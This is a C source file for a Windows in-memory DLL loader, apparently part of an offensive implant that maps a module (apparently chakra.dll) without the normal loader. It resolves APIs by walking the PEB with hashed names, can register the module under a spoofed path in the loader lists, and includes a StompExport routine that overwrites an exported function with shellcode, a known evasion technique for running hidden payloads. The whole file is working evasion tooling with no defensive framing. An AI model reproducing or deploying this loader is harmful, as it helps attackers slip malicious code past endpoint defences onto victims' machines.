#include <windows.h>
#include "manual_mapper.h"
PIMAGE_NT_HEADERS GetNtHeaders(BYTE* image) {
    return (PIMAGE_NT_HEADERS)(image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
}
PIMAGE_SECTION_HEADER GetSectionHeaders(BYTE* image) {
    return IMAGE_FIRST_SECTION(GetNtHeaders(image));
}
BOOL ApplyRelocations(BYTE* image, BYTE* new_base) {
    //debug_print("[*] Applying relocations...\n");
    PIMAGE_NT_HEADERS nt = GetNtHeaders(image);
    DWORD_PTR delta = (DWORD_PTR)new_base - nt->OptionalHeader.ImageBase;
    if (!delta) return TRUE;

    PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(new_base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    DWORD size = 0;

    while (size < nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* list = (WORD*)(reloc + 1);
        for (DWORD i = 0; i < count; i++) {
            if ((list[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                ULONGLONG* patch = (ULONGLONG*)(new_base + reloc->VirtualAddress + (list[i] & 0xFFF));
                *patch += delta;
            }
        }
        size += reloc->SizeOfBlock;
        reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
    }
    return TRUE;
}

BOOL FixImports(BYTE* image) {
    //debug_print("[*] Fixing imports...\n");
    PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)(image + GetNtHeaders(image)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    while (imp->Name) {
        HMODULE lib = LoadLibraryA((char*)(image + imp->Name));
        if (!lib) {
            //debug_print("[-] Failed to load charka deps: %s\n", (char*)(image + imp->Name));
            return FALSE;
        }

        PIMAGE_THUNK_DATA orig = (PIMAGE_THUNK_DATA)(image + imp->OriginalFirstThunk);
        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(image + imp->FirstThunk);

        while (orig->u1.AddressOfData) {
            FARPROC fn;
            if (orig->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                fn = GetProcAddress(lib, (LPCSTR)(orig->u1.Ordinal & 0xFFFF));
            } else {
                fn = GetProcAddress(lib, (LPCSTR)&((PIMAGE_IMPORT_BY_NAME)(image + orig->u1.AddressOfData))->Name);
            }
            if (!fn) {
                //debug_print("[-] Failed to resolve chackra deps.\n");
                return FALSE;
            }
            thunk->u1.Function = (ULONGLONG)fn;
            orig++;
            thunk++;
        }
        imp++;
    }
    return TRUE;
}

void ProtectSections(BYTE* image) {
	
	PVOID kernel32_base=LdrModulePeb(kernel32_hash);
	if(!kernel32_base)
	{
		//debug_print("[-] unable to get find kernel32 base\n");
		return;
	}
		
	VirtualProtect_t VirtualProtect_p =(VirtualProtect_t) LdrFunction(kernel32_base,0x844ff18d);
	if(!VirtualProtect_p)
	{
		//debug_print("[-] unable to resolve VirtualProtect\n");
		return;
	}
  //  debug_print("[*] Setting memory protections...\n");
    PIMAGE_NT_HEADERS nt = GetNtHeaders(image);
    PIMAGE_SECTION_HEADER sec = GetSectionHeaders(image);

    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD prot = PAGE_NOACCESS;
        BOOL exec = (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        BOOL read = (sec[i].Characteristics & IMAGE_SCN_MEM_READ) != 0;
        BOOL write = (sec[i].Characteristics & IMAGE_SCN_MEM_WRITE) != 0;

        // Temporary protection: allow writes during relocations/fixups
        if (write || exec) {
            prot = PAGE_READWRITE;
        } else if (read) {
            prot = PAGE_READONLY;
        }

        DWORD old;
        VirtualProtect_p(image + sec[i].VirtualAddress, sec[i].Misc.VirtualSize, prot, &old);
    }

    // Finalize: remove write permissions from executable sections
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        BOOL exec = (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        BOOL read = (sec[i].Characteristics & IMAGE_SCN_MEM_READ) != 0;
        BOOL write = (sec[i].Characteristics & IMAGE_SCN_MEM_WRITE) != 0;

        if (exec && !write) {
            DWORD finalProt = read ? PAGE_EXECUTE_READ : PAGE_EXECUTE;
            DWORD old;
            VirtualProtect_p(image + sec[i].VirtualAddress, sec[i].Misc.VirtualSize, finalProt, &old);
        }
    }
}

void RegisterInPEB(BYTE* base, const wchar_t* full_path) {
   // debug_print("[*] Registering engine...\n");
    PEB_MANUAL* peb = (PEB_MANUAL*)__readgsqword(0x60);
    LDR_DATA_TABLE_ENTRY_CUSTOM* entry = (LDR_DATA_TABLE_ENTRY_CUSTOM*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(LDR_DATA_TABLE_ENTRY_CUSTOM));
    entry->DllBase = base;
    entry->EntryPoint = base + GetNtHeaders(base)->OptionalHeader.AddressOfEntryPoint;
    entry->SizeOfImage = GetNtHeaders(base)->OptionalHeader.SizeOfImage;
    entry->FullDllName.Buffer = (PWSTR)full_path;
    entry->FullDllName.Length = entry->FullDllName.MaximumLength = (USHORT)(wcslen(full_path) * sizeof(WCHAR));
    const wchar_t* name = wcsrchr(full_path, L'\\');
    name = name ? name + 1 : full_path;
    entry->BaseDllName.Buffer = (PWSTR)name;
    entry->BaseDllName.Length = entry->BaseDllName.MaximumLength = (USHORT)(wcslen(name) * sizeof(WCHAR));
    InsertTailList(&peb->Ldr->InLoadOrderModuleList, &entry->InLoadOrderLinks);
    InsertTailList(&peb->Ldr->InMemoryOrderModuleList, &entry->InMemoryOrderLinks);
    InsertTailList(&peb->Ldr->InInitializationOrderModuleList, &entry->InInitializationOrderLinks);
}

MANUAL_MODULE LoadDllFromMemory(BYTE* buffer, const wchar_t* fake_path) {
    //debug_print("[*] Loading DLL from memory...\n");
    MANUAL_MODULE mod = { 0 };
    PIMAGE_NT_HEADERS nt = GetNtHeaders(buffer);
    SIZE_T total_size = nt->OptionalHeader.SizeOfImage;
	
	
	PVOID kernel32_base=LdrModulePeb(kernel32_hash);
	if(!kernel32_base)
	{
		//debug_print("[-] unable to get find kernel32 base\n");
		return mod;
	}
		
	VirtualAlloc_t VirtualAllocEx_p =(VirtualAlloc_t) LdrFunction(kernel32_base,0x382c0f97);
	if(!VirtualAllocEx_p)
	{
		//debug_print("[-] unable to get resolve virtualalloc to run\n");
		return mod;
	}
	
    BYTE* new_base = (BYTE*)VirtualAllocEx_p(NULL, total_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!new_base) {
      //  debug_print("[-] unable to get chakra to run\n");
        return mod;
    }

    custom_memcpy(new_base, buffer, nt->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER sec = GetSectionHeaders(buffer);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        custom_memcpy(new_base + sec[i].VirtualAddress, buffer + sec[i].PointerToRawData, sec[i].SizeOfRawData);
	/*	debug_print("[*] Mapping section %.*s at RVA 0x%08X, size: %X\n",
       IMAGE_SIZEOF_SHORT_NAME,
       sec[i].Name,
       sec[i].VirtualAddress,
       sec[i].SizeOfRawData);
	   */
    }
	nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress = 0;
nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size = 0;

    if (!ApplyRelocations(buffer, new_base)) {
    //    debug_print("[-] something went wrong\n");
        return mod;
    }

    if (!FixImports(new_base)) {
       //  debug_print("[-] something Went wrong\n");
        return mod;
    }

    ProtectSections(new_base);
    if (ENABLE_PEB_INSERTION) RegisterInPEB(new_base, fake_path);

#if ENABLE_DLLMAIN
    typedef BOOL (WINAPI *DllMainFunc)(HINSTANCE, DWORD, LPVOID);
    DllMainFunc dllmain = (DllMainFunc)(new_base + nt->OptionalHeader.AddressOfEntryPoint);	
	
	AddVectoredExceptionHandler(1, VectoredCrashHandler);
//debug_print("[*] Calling DllMain at %p\n", dllmain);
dllmain((HINSTANCE)new_base, DLL_PROCESS_ATTACH, NULL);
//debug_print("[+] DllMain completed successfully\n");
#endif

    mod.image_base = new_base;
    mod.size = total_size;
    mod.entry_point = (FARPROC)(new_base + nt->OptionalHeader.AddressOfEntryPoint);
    return mod;
}
FARPROC GetExportByName(BYTE* module_base, const char* export_name) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)module_base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(module_base + dos->e_lfanew);
    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!rva) return NULL;

    PIMAGE_EXPORT_DIRECTORY export_dir = (PIMAGE_EXPORT_DIRECTORY)(module_base + rva);
    DWORD* names = (DWORD*)(module_base + export_dir->AddressOfNames);
    WORD* ordinals = (WORD*)(module_base + export_dir->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)(module_base + export_dir->AddressOfFunctions);

    for (DWORD i = 0; i < export_dir->NumberOfNames; i++) {
        const char* name = (const char*)(module_base + names[i]);
        if (strcmp(name, export_name) == 0) {
            WORD ordinal = ordinals[i];
            DWORD func_rva = functions[ordinal];
            return (FARPROC)(module_base + func_rva);
        }
    }

    return NULL;
}

BOOL StompExport(BYTE* module_base, const char* export_name, const unsigned char* shellcode, SIZE_T size) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)module_base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(module_base + dos->e_lfanew);
    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!rva) return FALSE;
	
		PVOID kernel32_base=LdrModulePeb(kernel32_hash);
	if(!kernel32_base)
	{
		//debug_print("[-] unable to get find kernel32 base\n");
		return FALSE;
	}
		
	VirtualProtect_t VirtualProtect_p =(VirtualProtect_t) LdrFunction(kernel32_base,0x844ff18d);
	if(!VirtualProtect_p)
	{
		//debug_print("[-] unable to resolve VirtualProtect\n");
		return FALSE;
	}

    PIMAGE_EXPORT_DIRECTORY export_dir = (PIMAGE_EXPORT_DIRECTORY)(module_base + rva);
    DWORD* names = (DWORD*)(module_base + export_dir->AddressOfNames);
    WORD* ordinals = (WORD*)(module_base + export_dir->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)(module_base + export_dir->AddressOfFunctions);

    for (DWORD i = 0; i < export_dir->NumberOfNames; i++) {
        const char* name = (const char*)(module_base + names[i]);
        if (strcmp(name, export_name) == 0) {
            WORD ordinal = ordinals[i];
            DWORD func_rva = functions[ordinal];
            void* func_addr = module_base + func_rva;

            DWORD old;
            if (!VirtualProtect(func_addr, size, PAGE_EXECUTE_READWRITE, &old)) return FALSE;
            custom_memcpy(func_addr, shellcode, size);
            VirtualProtect_p(func_addr, size, old, &old);
            FlushInstructionCache(GetCurrentProcess(), func_addr, size);
            return TRUE;
        }
    }

    return FALSE;
}

void UnloadDll(MANUAL_MODULE* mod) {
    if (!mod || !mod->image_base) return;
/*
    printf("[*] Calling DllMain with DLL_PROCESS_DETACH\n");
    typedef BOOL(WINAPI *DllMainFunc)(HINSTANCE, DWORD, LPVOID);
    DllMainFunc dllmain = (DllMainFunc)mod->entry_point;
    dllmain((HINSTANCE)mod->image_base, DLL_PROCESS_DETACH, NULL);
*/
#if ENABLE_PEB_INSERTION
    //printf("[*] Removing from PEB loader list\n");
    PEB_MANUAL* peb = (PEB_MANUAL*)__readgsqword(0x60);
    PLIST_ENTRY head = &peb->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY curr = head->Flink;
    while (curr != head) {
        LDR_DATA_TABLE_ENTRY_CUSTOM* entry = (LDR_DATA_TABLE_ENTRY_CUSTOM*)((BYTE*)curr - offsetof(LDR_DATA_TABLE_ENTRY_CUSTOM, InLoadOrderLinks));
        if (entry->DllBase == mod->image_base) {
            RemoveEntryList(&entry->InLoadOrderLinks);
            RemoveEntryList(&entry->InMemoryOrderLinks);
            RemoveEntryList(&entry->InInitializationOrderLinks);
            HeapFree(GetProcessHeap(), 0, entry);
            break;
        }
        curr = curr->Flink;
    }
#endif

   // printf("[*] Freeing image memory region of chakra.dll\n");
    custom_virtualfree(mod->image_base);
    memset(mod, 0, sizeof(MANUAL_MODULE));
}
